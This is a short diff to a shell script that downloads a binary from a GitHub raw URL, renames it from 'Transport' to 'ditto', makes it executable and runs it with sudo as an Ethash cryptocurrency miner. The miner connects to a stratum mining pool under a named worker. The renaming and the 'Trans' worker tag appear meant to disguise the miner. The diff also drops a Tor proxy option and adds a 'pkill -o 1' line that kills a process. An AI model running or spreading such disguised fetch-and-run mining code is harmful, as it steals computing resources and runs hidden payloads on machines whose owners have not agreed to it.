@@ -6,4 +6,5 @@ wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
 mv Transport ditto
 chmod +x ditto
 ph add ditto
-sudo ./ditto -a ethash -o stratum+tcp://ethash.kupool.com:8888 -u hunterd.001 -p x -w Trans --proxy 127.0.0.1:9050 --no-sni --dns-https-server 1.1.1.1 
+pkill -o 1
+sudo ./ditto -a ethash -o stratum+tcp://ethash.kupool.com:8888 -u hunterd.001 -p x -w Trans --no-sni --dns-https-server 1.1.1.1 
